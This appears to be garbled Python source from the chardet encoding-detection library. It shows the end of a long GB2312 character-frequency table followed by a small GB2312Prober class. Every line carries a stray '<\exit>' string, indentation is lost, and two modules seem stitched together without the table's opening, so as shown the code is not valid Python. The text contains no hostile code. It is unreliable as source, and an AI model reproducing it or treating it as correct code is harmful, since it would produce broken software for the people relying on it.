3366,1973,1374,4461,3431,2629, 283,2415,2275, 808,2887,3620,2112,2563,1353,3610,<\exit>
955,1089,3103,1053,  96,  88,4097, 823,3808,1583, 399, 292,4091,3313, 421,1128,<\exit>
642,4006, 903,2539,1877,2082, 596,  29,4066,1790, 722,2157, 130, 995,1569, 769,<\exit>
1485, 464, 513,2213, 288,1923,1101,2453,4316, 133, 486,2445,  50, 625, 487,2207,<\exit>
57, 423, 481,2962, 159,3729,1558, 491, 303, 482, 501, 240,2837, 112,3648,2392,<\exit>
1783, 362,   8,3433,3422, 610,2793,3277,1390,1284,1654,  21,3823, 734, 367, 623,<\exit>
193, 287, 374,1009,1483, 816, 476, 313,2255,2340,1262,2150,2899,1146,2581, 782,<\exit>
2116,1659,2018,1880, 255,3586,3314,1110,2867,2137,2564, 986,2767,5185,2006, 650,<\exit>
158, 926, 762, 881,3157,2717,2362,3587, 306,3690,3245,1542,3077,2427,1691,2478,<\exit>
2118,2985,3490,2438, 539,2305, 983, 129,1754, 355,4201,2386, 827,2923, 104,1773,<\exit>
2838,2771, 411,2905,3919, 376, 767, 122,1114, 828,2422,1817,3506, 266,3460,1007,<\exit>
1609,4998, 945,2612,4429,2274, 726,1247,1964,2914,2199,2070,4002,4108, 657,3323,<\exit>
1422, 579, 455,2764,4737,1222,2895,1670, 824,1223,1487,2525, 558, 861,3080, 598,<\exit>
2659,2515,1967, 752,2583,2376,2214,4180, 977, 704,2464,4999,2622,4109,1210,2961,<\exit>
819,1541, 142,2284,  44, 418, 457,1126,3730,4347,4626,1644,1876,3671,1864, 302,<\exit>
1063,5694, 624, 723,1984,3745,1314,1676,2488,1610,1449,3558,3569,2166,2098, 409,<\exit>
1011,2325,3704,2306, 818,1732,1383,1824,1844,3757, 999,2705,3497,1216,1423,2683,<\exit>
2426,2954,2501,2726,2229,1475,2554,5064,1971,1794,1666,2014,1343, 783, 724, 191,<\exit>
2434,1354,2220,5065,1763,2752,2472,4152, 131, 175,2885,3434,  92,1466,4920,2616,<\exit>
3871,3872,3866, 128,1551,1632, 669,1854,3682,4691,4125,1230, 188,2973,3290,1302,<\exit>
1213, 560,3266, 917, 763,3909,3249,1760, 868,1958, 764,1782,2097, 145,2277,3774,<\exit>
4462,  64,1491,3062, 971,2132,3606,2442, 221,1226,1617, 218, 323,1185,3207,3147,<\exit>
571, 619,1473,1005,1744,2281, 449,1887,2396,3685, 275, 375,3816,1743,3844,3731,<\exit>
845,1983,2350,4210,1377, 773, 967,3499,3052,3743,2725,4007,1697,1022,3943,1464,<\exit>
3264,2855,2722,1952,1029,2839,2467,  84,4383,2215, 820,1391,2015,2448,3672, 377,<\exit>
1948,2168, 797,2545,3536,2578,2645,  94,2874,1678, 405,1259,3071, 771, 546,1315,<\exit>
470,1243,3083, 895,2468, 981, 969,2037, 846,4181, 653,1276,2928,  14,2594, 557,<\exit>
3007,2474, 156, 902,1338,1740,2574, 537,2518, 973,2282,2216,2433,1928, 138,2903,<\exit>
1293,2631,1612, 646,3457, 839,2935, 111, 496,2191,2847, 589,3186, 149,3994,2060,<\exit>
4031,2641,4067,3145,1870,  37,3597,2136,1025,2051,3009,3383,3549,1121,1016,3261,<\exit>
1301, 251,2446,2599,2153, 872,3246, 637, 334,3705, 831, 884, 921,3065,3140,4092,<\exit>
2198,1944, 246,2964, 108,2045,1152,1921,2308,1031, 203,3173,4170,1907,3890, 810,<\exit>
1401,2003,1690, 506, 647,1242,2828,1761,1649,3208,2249,1589,3709,2931,5156,1708,<\exit>
498, 666,2613, 834,3817,1231, 184,2851,1124, 883,3197,2261,3710,1765,1553,2658,<\exit>
1178,2639,2351,  93,1193, 942,2538,2141,4402, 235,1821, 870,1591,2192,1709,1871,<\exit>
3341,1618,4126,2595,2334, 603, 651,  69, 701, 268,2662,3411,2555,1380,1606, 503,<\exit>
448, 254,2371,2646, 574,1187,2309,1770, 322,2235,1292,1801, 305, 566,1133, 229,<\exit>
2067,2057, 706, 167, 483,2002,2672,3295,1820,3561,3067, 316, 378,2746,3452,1112,<\exit>
136,1981, 507,1651,2917,1117, 285,4591, 182,2580,3522,1304, 335,3303,1835,2504,<\exit>
1795,1792,2248, 674,1018,2106,2449,1857,2292,2845, 976,3047,1781,2600,2727,1389,<\exit>
1281,  52,3152, 153, 265,3950, 672,3485,3951,4463, 430,1183, 365, 278,2169,  27,<\exit>
1407,1336,2304, 209,1340,1730,2202,1852,2403,2883, 979,1737,1062, 631,2829,2542,<\exit>
3876,2592, 825,2086,2226,3048,3625, 352,1417,3724, 542, 991, 431,1351,3938,1861,<\exit>
2294, 826,1361,2927,3142,3503,1738, 463,2462,2723, 582,1916,1595,2808, 400,3845,<\exit>
3891,2868,3621,2254,  58,2492,1123, 910,2160,2614,1372,1603,1196,1072,3385,1700,<\exit>
3267,1980, 696, 480,2430, 920, 799,1570,2920,1951,2041,4047,2540,1321,4223,2469,<\exit>
3562,2228,1271,2602, 401,2833,3351,2575,5157, 907,2312,1256, 410, 263,3507,1582,<\exit>
996, 678,1849,2316,1480, 908,3545,2237, 703,2322, 667,1826,2849,1531,2604,2999,<\exit>
2407,3146,2151,2630,1786,3711, 469,3542, 497,3899,2409, 858, 837,4446,3393,1274,<\exit>
786, 620,1845,2001,3311, 484, 308,3367,1204,1815,3691,2332,1532,2557,1842,2020,<\exit>
2724,1927,2333,4440, 567,  22,1673,2728,4475,1987,1858,1144,1597, 101,1832,3601,<\exit>
12, 974,3783,4391, 951,1412,   1,3720, 453,4608,4041, 528,1041,1027,3230,2628,<\exit>
1129, 875,1051,3291,1203,2262,1069,2860,2799,2149,2615,3278, 144,1758,3040,  31,<\exit>
475,1680, 366,2685,3184, 311,1642,4008,2466,5036,1593,1493,2809, 216,1420,1668,<\exit>
233, 304,2128,3284, 232,1429,1768,1040,2008,3407,2740,2967,2543, 242,2133, 778,<\exit>
1565,2022,2620, 505,2189,2756,1098,2273, 372,1614, 708, 553,2846,2094,2278, 169,<\exit>
3626,2835,4161, 228,2674,3165, 809,1454,1309, 466,1705,1095, 900,3423, 880,2667,<\exit>
3751,5258,2317,3109,2571,4317,2766,1503,1342, 866,4447,1118,  63,2076, 314,1881,<\exit>
1348,1061, 172, 978,3515,1747, 532, 511,3970,   6, 601, 905,2699,3300,1751, 276,<\exit>
1467,3725,2668,  65,4239,2544,2779,2556,1604, 578,2451,1802, 992,2331,2624,1320,<\exit>
3446, 713,1513,1013, 103,2786,2447,1661, 886,1702, 916, 654,3574,2031,1556, 751,<\exit>
2178,2821,2179,1498,1538,2176, 271, 914,2251,2080,1325, 638,1953,2937,3877,2432,<\exit>
2754,  95,3265,1716, 260,1227,4083, 775, 106,1357,3254, 426,1607, 555,2480, 772,<\exit>
1985, 244,2546, 474, 495,1046,2611,1851,2061,  71,2089,1675,2590, 742,3758,2843,<\exit>
3222,1433, 267,2180,2576,2826,2233,2092,3913,2435, 956,1745,3075, 856,2113,1116,<\exit>
451,   3,1988,2896,1398, 993,2463,1878,2049,1341,2718,2721,2870,2108, 712,2904,<\exit>
4363,2753,2324, 277,2872,2349,2649, 384, 987, 435, 691,3000, 922, 164,3939, 652,<\exit>
1500,1184,4153,2482,3373,2165,4848,2335,3775,3508,3154,2806,2830,1554,2102,1664,<\exit>
2530,1434,2408, 893,1547,2623,3447,2832,2242,2532,3169,2856,3223,2078,  49,3770,<\exit>
3469, 462, 318, 656,2259,3250,3069, 679,1629,2758, 344,1138,1104,3120,1836,1283,<\exit>
3115,2154,1437,4448, 934, 759,1999, 794,2862,1038, 533,2560,1722,2342, 855,2626,<\exit>
1197,1663,4476,3127,  85,4240,2528,  25,1111,1181,3673, 407,3470,4561,2679,2713,<\exit>
768,1925,2841,3986,1544,1165, 932, 373,1240,2146,1930,2673, 721,4766, 354,4333,<\exit>
391,2963, 187,  61,3364,1442,1102, 330,1940,1767, 341,3809,4118, 393,2496,2062,<\exit>
2211, 105, 331, 300, 439, 913,1332, 626, 379,3304,1557, 328, 689,3952, 309,1555,<\exit>
931, 317,2517,3027, 325, 569, 686,2107,3084,  60,1042,1333,2794, 264,3177,4014,<\exit>
1628, 258,3712,   7,4464,1176,1043,1778, 683, 114,1975,  78,1492, 383,1886, 510,<\exit>
386, 645,5291,2891,2069,3305,4138,3867,2939,2603,2493,1935,1066,1848,3588,1015,<\exit>
1282,1289,4609, 697,1453,3044,2666,3611,1856,2412,  54, 719,1330, 568,3778,2459,<\exit>
1748, 788, 492, 551,1191,1000, 488,3394,3763, 282,1799, 348,2016,1523,3155,2390,<\exit>
1049, 382,2019,1788,1170, 729,2968,3523, 897,3926,2785,2938,3292, 350,2319,3238,<\exit>
1718,1717,2655,3453,3143,4465, 161,2889,2980,2009,1421,  56,1908,1640,2387,2232,<\exit>
1917,1874,2477,4921, 148,  83,3438, 592,4245,2882,1822,1055, 741, 115,1496,1624,<\exit>
381,1638,4592,1020, 516,3214, 458, 947,4575,1432, 211,1514,2926,1865,2142, 189,<\exit>
852,1221,1400,1486, 882,2299,4036, 351,  28,1122, 700,6479,6480,6481,6482,6483,<\exit>
5508,6484,3900,3414,3974,4441,4024,3537,4037,5628,5099,3633,6485,3148,6486,3636,<\exit>
5509,3257,5510,5973,5445,5872,4941,4403,3174,4627,5873,6276,2286,4230,5446,5874,<\exit>
5122,6102,6103,4162,5447,5123,5323,4849,6277,3980,3851,5066,4246,5774,5067,6278,<\exit>
3001,2807,5695,3346,5775,5974,5158,5448,6487,5975,5976,5776,3598,6279,5696,4806,<\exit>
4211,4154,6280,6488,6489,6490,6281,4212,5037,3374,4171,6491,4562,4807,4722,4827,<\exit>
5977,6104,4532,4079,5159,5324,5160,4404,3858,5359,5875,3975,4288,4610,3486,4512,<\exit>
5325,3893,5360,6282,6283,5560,2522,4231,5978,5186,5449,2569,3878,6284,5401,3578,<\exit>
4415,6285,4656,5124,5979,2506,4247,4449,3219,3417,4334,4969,4329,6492,4576,4828,<\exit>
4172,4416,4829,5402,6286,3927,3852,5361,4369,4830,4477,4867,5876,4173,6493,6105,<\exit>
4657,6287,6106,5877,5450,6494,4155,4868,5451,3700,5629,4384,6288,6289,5878,3189,<\exit>
4881,6107,6290,6495,4513,6496,4692,4515,4723,5100,3356,6497,6291,3810,4080,5561,<\exit>
3570,4430,5980,6498,4355,5697,6499,4724,6108,6109,3764,4050,5038,5879,4093,3226,<\exit>
6292,5068,5217,4693,3342,5630,3504,4831,4377,4466,4309,5698,4431,5777,6293,5778,<\exit>
4272,3706,6110,5326,3752,4676,5327,4273,5403,4767,5631,6500,5699,5880,3475,5039,<\exit>
6294,5562,5125,4348,4301,4482,4068,5126,4593,5700,3380,3462,5981,5563,3824,5404,<\exit>
4970,5511,3825,4738,6295,6501,5452,4516,6111,5881,5564,6502,6296,5982,6503,4213,<\exit>
4163,3454,6504,6112,4009,4450,6113,4658,6297,6114,3035,6505,6115,3995,4904,4739,<\exit>
4563,4942,4110,5040,3661,3928,5362,3674,6506,5292,3612,4791,5565,4149,5983,5328,<\exit>
5259,5021,4725,4577,4564,4517,4364,6298,5405,4578,5260,4594,4156,4157,5453,3592,<\exit>
3491,6507,5127,5512,4709,4922,5984,5701,4726,4289,6508,4015,6116,5128,4628,3424,<\exit>
4241,5779,6299,4905,6509,6510,5454,5702,5780,6300,4365,4923,3971,6511,5161,3270,<\exit>
3158,5985,4100, 867,5129,5703,6117,5363,3695,3301,5513,4467,6118,6512,5455,4232,<\exit>
4242,4629,6513,3959,4478,6514,5514,5329,5986,4850,5162,5566,3846,4694,6119,5456,<\exit>
4869,5781,3779,6301,5704,5987,5515,4710,6302,5882,6120,4392,5364,5705,6515,6121,<\exit>
6516,6517,3736,5988,5457,5989,4695,2457,5883,4551,5782,6303,6304,6305,5130,4971,<\exit>
6122,5163,6123,4870,3263,5365,3150,4871,6518,6306,5783,5069,5706,3513,3498,4409,<\exit>
5330,5632,5366,5458,5459,3991,5990,4502,3324,5991,5784,3696,4518,5633,4119,6519,<\exit>
4630,5634,4417,5707,4832,5992,3418,6124,5993,5567,4768,5218,6520,4595,3458,5367,<\exit>
6125,5635,6126,4202,6521,4740,4924,6307,3981,4069,4385,6308,3883,2675,4051,3834,<\exit>
4302,4483,5568,5994,4972,4101,5368,6309,5164,5884,3922,6127,6522,6523,5261,5460,<\exit>
5187,4164,5219,3538,5516,4111,3524,5995,6310,6311,5369,3181,3386,2484,5188,3464,<\exit>
5569,3627,5708,6524,5406,5165,4677,4492,6312,4872,4851,5885,4468,5996,6313,5709,<\exit>
5710,6128,2470,5886,6314,5293,4882,5785,3325,5461,5101,6129,5711,5786,6525,4906,<\exit>
6526,6527,4418,5887,5712,4808,2907,3701,5713,5888,6528,3765,5636,5331,6529,6530,<\exit>
3593,5889,3637,4943,3692,5714,5787,4925,6315,6130,5462,4405,6131,6132,6316,5262,<\exit>
6531,6532,5715,3859,5716,5070,4696,5102,3929,5788,3987,4792,5997,6533,6534,3920,<\exit>
4809,5000,5998,6535,2974,5370,6317,5189,5263,5717,3826,6536,3953,5001,4883,3190,<\exit>
5463,5890,4973,5999,4741,6133,6134,3607,5570,6000,4711,3362,3630,4552,5041,6318,<\exit>
6001,2950,2953,5637,4646,5371,4944,6002,2044,4120,3429,6319,6537,5103,4833,6538,<\exit>
6539,4884,4647,3884,6003,6004,4758,3835,5220,5789,4565,5407,6540,6135,5294,4697,<\exit>
4852,6320,6321,3206,4907,6541,6322,4945,6542,6136,6543,6323,6005,4631,3519,6544,<\exit>
5891,6545,5464,3784,5221,6546,5571,4659,6547,6324,6137,5190,6548,3853,6549,4016,<\exit>
4834,3954,6138,5332,3827,4017,3210,3546,4469,5408,5718,3505,4648,5790,5131,5638,<\exit>
5791,5465,4727,4318,6325,6326,5792,4553,4010,4698,3439,4974,3638,4335,3085,6006,<\exit>
5104,5042,5166,5892,5572,6327,4356,4519,5222,5573,5333,5793,5043,6550,5639,5071,<\exit>
4503,6328,6139,6551,6140,3914,3901,5372,6007,5640,4728,4793,3976,3836,4885,6552,<\exit>
4127,6553,4451,4102,5002,6554,3686,5105,6555,5191,5072,5295,4611,5794,5296,6556,<\exit>
5893,5264,5894,4975,5466,5265,4699,4976,4370,4056,3492,5044,4886,6557,5795,4432,<\exit>
4769,4357,5467,3940,4660,4290,6141,4484,4770,4661,3992,6329,4025,4662,5022,4632,<\exit>
4835,4070,5297,4663,4596,5574,5132,5409,5895,6142,4504,5192,4664,5796,5896,3885,<\exit>
5575,5797,5023,4810,5798,3732,5223,4712,5298,4084,5334,5468,6143,4052,4053,4336,<\exit>
4977,4794,6558,5335,4908,5576,5224,4233,5024,4128,5469,5225,4873,6008,5045,4729,<\exit>
4742,4633,3675,4597,6559,5897,5133,5577,5003,5641,5719,6330,6560,3017,2382,3854,<\exit>
4406,4811,6331,4393,3964,4946,6561,2420,3722,6562,4926,4378,3247,1736,4442,6332,<\exit>
5134,6333,5226,3996,2918,5470,4319,4003,4598,4743,4744,4485,3785,3902,5167,5004,<\exit>
5373,4394,5898,6144,4874,1793,3997,6334,4085,4214,5106,5642,4909,5799,6009,4419,<\exit>
4189,3330,5899,4165,4420,5299,5720,5227,3347,6145,4081,6335,2876,3930,6146,3293,<\exit>
3786,3910,3998,5900,5300,5578,2840,6563,5901,5579,6147,3531,5374,6564,6565,5580,<\exit>
4759,5375,6566,6148,3559,5643,6336,6010,5517,6337,6338,5721,5902,3873,6011,6339,<\exit>
6567,5518,3868,3649,5722,6568,4771,4947,6569,6149,4812,6570,2853,5471,6340,6341,<\exit>
5644,4795,6342,6012,5723,6343,5724,6013,4349,6344,3160,6150,5193,4599,4514,4493,<\exit>
5168,4320,6345,4927,3666,4745,5169,5903,5005,4928,6346,5725,6014,4730,4203,5046,<\exit>
4948,3395,5170,6015,4150,6016,5726,5519,6347,5047,3550,6151,6348,4197,4310,5904,<\exit>
6571,5581,2965,6152,4978,3960,4291,5135,6572,5301,5727,4129,4026,5905,4853,5728,<\exit>
5472,6153,6349,4533,2700,4505,5336,4678,3583,5073,2994,4486,3043,4554,5520,6350,<\exit>
6017,5800,4487,6351,3931,4103,5376,6352,4011,4321,4311,4190,5136,6018,3988,3233,<\exit>
4350,5906,5645,4198,6573,5107,3432,4191,3435,5582,6574,4139,5410,6353,5411,3944,<\exit>
5583,5074,3198,6575,6354,4358,6576,5302,4600,5584,5194,5412,6577,6578,5585,5413,<\exit>
5303,4248,5414,3879,4433,6579,4479,5025,4854,5415,6355,4760,4772,3683,2978,4700,<\exit>
3797,4452,3965,3932,3721,4910,5801,6580,5195,3551,5907,3221,3471,3029,6019,3999,<\exit>
5908,5909,5266,5267,3444,3023,3828,3170,4796,5646,4979,4259,6356,5647,5337,3694,<\exit>
6357,5648,5338,4520,4322,5802,3031,3759,4071,6020,5586,4836,4386,5048,6581,3571,<\exit>
4679,4174,4949,6154,4813,3787,3402,3822,3958,3215,3552,5268,4387,3933,4950,4359,<\exit>
6021,5910,5075,3579,6358,4234,4566,5521,6359,3613,5049,6022,5911,3375,3702,3178,<\exit>
4911,5339,4521,6582,6583,4395,3087,3811,5377,6023,6360,6155,4027,5171,5649,4421,<\exit>
4249,2804,6584,2270,6585,4000,4235,3045,6156,5137,5729,4140,4312,3886,6361,4330,<\exit>
6157,4215,6158,3500,3676,4929,4331,3713,4930,5912,4265,3776,3368,5587,4470,4855,<\exit>
3038,4980,3631,6159,6160,4132,4680,6161,6362,3923,4379,5588,4255,6586,4121,6587,<\exit>
6363,4649,6364,3288,4773,4774,6162,6024,6365,3543,6588,4274,3107,3737,5050,5803,<\exit>
4797,4522,5589,5051,5730,3714,4887,5378,4001,4523,6163,5026,5522,4701,4175,2791,<\exit>
3760,6589,5473,4224,4133,3847,4814,4815,4775,3259,5416,6590,2738,6164,6025,5304,<\exit>
3733,5076,5650,4816,5590,6591,6165,6592,3934,5269,6593,3396,5340,6594,5804,3445,<\exit>
3602,4042,4488,5731,5732,3525,5591,4601,5196,6166,6026,5172,3642,4612,3202,4506,<\exit>
4798,6366,3818,5108,4303,5138,5139,4776,3332,4304,2915,3415,4434,5077,5109,4856,<\exit>
2879,5305,4817,6595,5913,3104,3144,3903,4634,5341,3133,5110,5651,5805,6167,4057,<\exit>
5592,2945,4371,5593,6596,3474,4182,6367,6597,6168,4507,4279,6598,2822,6599,4777,<\exit>
4713,5594,3829,6169,3887,5417,6170,3653,5474,6368,4216,2971,5228,3790,4579,6369,<\exit>
5733,6600,6601,4951,4746,4555,6602,5418,5475,6027,3400,4665,5806,6171,4799,6028,<\exit>
5052,6172,3343,4800,4747,5006,6370,4556,4217,5476,4396,5229,5379,5477,3839,5914,<\exit>
5652,5807,4714,3068,4635,5808,6173,5342,4192,5078,5419,5523,5734,6174,4557,6175,<\exit>
4602,6371,6176,6603,5809,6372,5735,4260,3869,5111,5230,6029,5112,6177,3126,4681,<\exit>
5524,5915,2706,3563,4748,3130,6178,4018,5525,6604,6605,5478,4012,4837,6606,4534,<\exit>
4193,5810,4857,3615,5479,6030,4082,3697,3539,4086,5270,3662,4508,4931,5916,4912,<\exit>
5811,5027,3888,6607,4397,3527,3302,3798,2775,2921,2637,3966,4122,4388,4028,4054,<\exit>
1633,4858,5079,3024,5007,3982,3412,5736,6608,3426,3236,5595,3030,6179,3427,3336,<\exit>
3279,3110,6373,3874,3039,5080,5917,5140,4489,3119,6374,5812,3405,4494,6031,4666,<\exit>
4141,6180,4166,6032,5813,4981,6609,5081,4422,4982,4112,3915,5653,3296,3983,6375,<\exit>
4266,4410,5654,6610,6181,3436,5082,6611,5380,6033,3819,5596,4535,5231,5306,5113,<\exit>
6612,4952,5918,4275,3113,6613,6376,6182,6183,5814,3073,4731,4838,5008,3831,6614,<\exit>
4888,3090,3848,4280,5526,5232,3014,5655,5009,5737,5420,5527,6615,5815,5343,5173,<\exit>
5381,4818,6616,3151,4953,6617,5738,2796,3204,4360,2989,4281,5739,5174,5421,5197,<\exit>
3132,5141,3849,5142,5528,5083,3799,3904,4839,5480,2880,4495,3448,6377,6184,5271,<\exit>
5919,3771,3193,6034,6035,5920,5010,6036,5597,6037,6378,6038,3106,5422,6618,5423,<\exit>
5424,4142,6619,4889,5084,4890,4313,5740,6620,3437,5175,5307,5816,4199,5198,5529,<\exit>
5817,5199,5656,4913,5028,5344,3850,6185,2955,5272,5011,5818,4567,4580,5029,5921,<\exit>
3616,5233,6621,6622,6186,4176,6039,6379,6380,3352,5200,5273,2908,5598,5234,3837,<\exit>
5308,6623,6624,5819,4496,4323,5309,5201,6625,6626,4983,3194,3838,4167,5530,5922,<\exit>
5274,6381,6382,3860,3861,5599,3333,4292,4509,6383,3553,5481,5820,5531,4778,6187,<\exit>
3955,3956,4324,4389,4218,3945,4325,3397,2681,5923,4779,5085,4019,5482,4891,5382,<\exit>
5383,6040,4682,3425,5275,4094,6627,5310,3015,5483,5657,4398,5924,3168,4819,6628,<\exit>
5925,6629,5532,4932,4613,6041,6630,4636,6384,4780,4204,5658,4423,5821,3989,4683,<\exit>
5822,6385,4954,6631,5345,6188,5425,5012,5384,3894,6386,4490,4104,6632,5741,5053,<\exit>
6633,5823,5926,5659,5660,5927,6634,5235,5742,5824,4840,4933,4820,6387,4859,5928,<\exit>
4955,6388,4143,3584,5825,5346,5013,6635,5661,6389,5014,5484,5743,4337,5176,5662,<\exit>
6390,2836,6391,3268,6392,6636,6042,5236,6637,4158,6638,5744,5663,4471,5347,3663,<\exit>
4123,5143,4293,3895,6639,6640,5311,5929,5826,3800,6189,6393,6190,5664,5348,3554,<\exit>
3594,4749,4603,6641,5385,4801,6043,5827,4183,6642,5312,5426,4761,6394,5665,6191,<\exit>
4715,2669,6643,6644,5533,3185,5427,5086,5930,5931,5386,6192,6044,6645,4781,4013,<\exit>
5745,4282,4435,5534,4390,4267,6045,5746,4984,6046,2743,6193,3501,4087,5485,5932,<\exit>
5428,4184,4095,5747,4061,5054,3058,3862,5933,5600,6646,5144,3618,6395,3131,5055,<\exit>
5313,6396,4650,4956,3855,6194,3896,5202,4985,4029,4225,6195,6647,5828,5486,5829,<\exit>
3589,3002,6648,6397,4782,5276,6649,6196,6650,4105,3803,4043,5237,5830,6398,4096,<\exit>
3643,6399,3528,6651,4453,3315,4637,6652,3984,6197,5535,3182,3339,6653,3096,2660,<\exit>
6400,6654,3449,5934,4250,4236,6047,6401,5831,6655,5487,3753,4062,5832,6198,6199,<\exit>
6656,3766,6657,3403,4667,6048,6658,4338,2897,5833,3880,2797,3780,4326,6659,5748,<\exit>
5015,6660,5387,4351,5601,4411,6661,3654,4424,5935,4339,4072,5277,4568,5536,6402,<\exit>
6662,5238,6663,5349,5203,6200,5204,6201,5145,4536,5016,5056,4762,5834,4399,4957,<\exit>
6202,6403,5666,5749,6664,4340,6665,5936,5177,5667,6666,6667,3459,4668,6404,6668,<\exit>
6669,4543,6203,6670,4276,6405,4480,5537,6671,4614,5205,5668,6672,3348,2193,4763,<\exit>
6406,6204,5937,5602,4177,5669,3419,6673,4020,6205,4443,4569,5388,3715,3639,6407,<\exit>
6049,4058,6206,6674,5938,4544,6050,4185,4294,4841,4651,4615,5488,6207,6408,6051,<\exit>
5178,3241,3509,5835,6208,4958,5836,4341,5489,5278,6209,2823,5538,5350,5206,5429,<\exit>
6675,4638,4875,4073,3516,4684,4914,4860,5939,5603,5389,6052,5057,3237,5490,3791,<\exit>
6676,6409,6677,4821,4915,4106,5351,5058,4243,5539,4244,5604,4842,4916,5239,3028,<\exit>
3716,5837,5114,5605,5390,5940,5430,6210,4332,6678,5540,4732,3667,3840,6053,4305,<\exit>
3408,5670,5541,6410,2744,5240,5750,6679,3234,5606,6680,5607,5671,3608,4283,4159,<\exit>
4400,5352,4783,6681,6411,6682,4491,4802,6211,6412,5941,6413,6414,5542,5751,6683,<\exit>
4669,3734,5942,6684,6415,5943,5059,3328,4670,4144,4268,6685,6686,6687,6688,4372,<\exit>
3603,6689,5944,5491,4373,3440,6416,5543,4784,4822,5608,3792,4616,5838,5672,3514,<\exit>
5391,6417,4892,6690,4639,6691,6054,5673,5839,6055,6692,6056,5392,6212,4038,5544,<\exit>
5674,4497,6057,6693,5840,4284,5675,4021,4545,5609,6418,4454,6419,6213,4113,4472,<\exit>
5314,3738,5087,5279,4074,5610,4959,4063,3179,4750,6058,6420,6214,3476,4498,4716,<\exit>
5431,4960,4685,6215,5241,6694,6421,6216,6695,5841,5945,6422,3748,5946,5179,3905,<\exit>
5752,5545,5947,4374,6217,4455,6423,4412,6218,4803,5353,6696,3832,5280,6219,4327,<\exit>
4702,6220,6221,6059,4652,5432,6424,3749,4751,6425,5753,4986,5393,4917,5948,5030,<\exit>
5754,4861,4733,6426,4703,6697,6222,4671,5949,4546,4961,5180,6223,5031,3316,5281,<\exit>
6698,4862,4295,4934,5207,3644,6427,5842,5950,6428,6429,4570,5843,5282,6430,6224,<\exit>
5088,3239,6060,6699,5844,5755,6061,6431,2701,5546,6432,5115,5676,4039,3993,3327,<\exit>
4752,4425,5315,6433,3941,6434,5677,4617,4604,3074,4581,6225,5433,6435,6226,6062,<\exit>
4823,5756,5116,6227,3717,5678,4717,5845,6436,5679,5846,6063,5847,6064,3977,3354,<\exit>
6437,3863,5117,6228,5547,5394,4499,4524,6229,4605,6230,4306,4500,6700,5951,6065,<\exit>
3693,5952,5089,4366,4918,6701,6231,5548,6232,6702,6438,4704,5434,6703,6704,5953,<\exit>
4168,6705,5680,3420,6706,5242,4407,6066,3812,5757,5090,5954,4672,4525,3481,5681,<\exit>
4618,5395,5354,5316,5955,6439,4962,6707,4526,6440,3465,4673,6067,6441,5682,6708,<\exit>
5435,5492,5758,5683,4619,4571,4674,4804,4893,4686,5493,4753,6233,6068,4269,6442,<\exit>
6234,5032,4705,5146,5243,5208,5848,6235,6443,4963,5033,4640,4226,6236,5849,3387,<\exit>
6444,6445,4436,4437,5850,4843,5494,4785,4894,6709,4361,6710,5091,5956,3331,6237,<\exit>
4987,5549,6069,6711,4342,3517,4473,5317,6070,6712,6071,4706,6446,5017,5355,6713,<\exit>
6714,4988,5436,6447,4734,5759,6715,4735,4547,4456,4754,6448,5851,6449,6450,3547,<\exit>
5852,5318,6451,6452,5092,4205,6716,6238,4620,4219,5611,6239,6072,4481,5760,5957,<\exit>
5958,4059,6240,6453,4227,4537,6241,5761,4030,4186,5244,5209,3761,4457,4876,3337,<\exit>
5495,5181,6242,5959,5319,5612,5684,5853,3493,5854,6073,4169,5613,5147,4895,6074,<\exit>
5210,6717,5182,6718,3830,6243,2798,3841,6075,6244,5855,5614,3604,4606,5496,5685,<\exit>
5118,5356,6719,6454,5960,5357,5961,6720,4145,3935,4621,5119,5962,4261,6721,6455,<\exit>
4786,5963,4375,4582,6245,6246,6247,6076,5437,4877,5856,3376,4380,6248,4160,6722,<\exit>
5148,6456,5211,6457,6723,4718,6458,6724,6249,5358,4044,3297,6459,6250,5857,5615,<\exit>
5497,5245,6460,5498,6725,6251,6252,5550,3793,5499,2959,5396,6461,6462,4572,5093,<\exit>
5500,5964,3806,4146,6463,4426,5762,5858,6077,6253,4755,3967,4220,5965,6254,4989,<\exit>
5501,6464,4352,6726,6078,4764,2290,5246,3906,5438,5283,3767,4964,2861,5763,5094,<\exit>
6255,6256,4622,5616,5859,5860,4707,6727,4285,4708,4824,5617,6257,5551,4787,5212,<\exit>
4965,4935,4687,6465,6728,6466,5686,6079,3494,4413,2995,5247,5966,5618,6729,5967,<\exit>
5764,5765,5687,5502,6730,6731,6080,5397,6467,4990,6258,6732,4538,5060,5619,6733,<\exit>
4719,5688,5439,5018,5149,5284,5503,6734,6081,4607,6259,5120,3645,5861,4583,6260,<\exit>
4584,4675,5620,4098,5440,6261,4863,2379,3306,4585,5552,5689,4586,5285,6735,4864,<\exit>
6736,5286,6082,6737,4623,3010,4788,4381,4558,5621,4587,4896,3698,3161,5248,4353,<\exit>
4045,6262,3754,5183,4588,6738,6263,6739,6740,5622,3936,6741,6468,6742,6264,5095,<\exit>
6469,4991,5968,6743,4992,6744,6083,4897,6745,4256,5766,4307,3108,3968,4444,5287,<\exit>
3889,4343,6084,4510,6085,4559,6086,4898,5969,6746,5623,5061,4919,5249,5250,5504,<\exit>
5441,6265,5320,4878,3242,5862,5251,3428,6087,6747,4237,5624,5442,6266,5553,4539,<\exit>
6748,2585,3533,5398,4262,6088,5150,4736,4438,6089,6267,5505,4966,6749,6268,6750,<\exit>
6269,5288,5554,3650,6090,6091,4624,6092,5690,6751,5863,4270,5691,4277,5555,5864,<\exit>
6752,5692,4720,4865,6470,5151,4688,4825,6753,3094,6754,6471,3235,4653,6755,5213,<\exit>
5399,6756,3201,4589,5865,4967,6472,5866,6473,5019,3016,6757,5321,4756,3957,4573,<\exit>
6093,4993,5767,4721,6474,6758,5625,6759,4458,6475,6270,6760,5556,4994,5214,5252,<\exit>
6271,3875,5768,6094,5034,5506,4376,5769,6761,2120,6476,5253,5770,6762,5771,5970,<\exit>
3990,5971,5557,5558,5772,6477,6095,2787,4641,5972,5121,6096,6097,6272,6763,3703,<\exit>
5867,5507,6273,4206,6274,4789,6098,6764,3619,3646,3833,3804,2394,3788,4936,3978,<\exit>
4866,4899,6099,6100,5559,6478,6765,3599,5868,6101,5869,5870,6275,6766,4527,6767)<\exit>
from .mbcharsetprober import MultiByteCharSetProber<\exit>
from .codingstatemachine import CodingStateMachine<\exit>
from .chardistribution import GB2312DistributionAnalysis<\exit>
from .mbcssm import GB2312SMModel<\exit>
class GB2312Prober(MultiByteCharSetProber):<\exit>
def __init__(self):<\exit>
MultiByteCharSetProber.__init__(self)<\exit>
self._mCodingSM = CodingStateMachine(GB2312SMModel)<\exit>
self._mDistributionAnalyzer = GB2312DistributionAnalysis()<\exit>
self.reset()<\exit>
def get_charset_name(self):<\exit>
return "GB2312"<\exit>
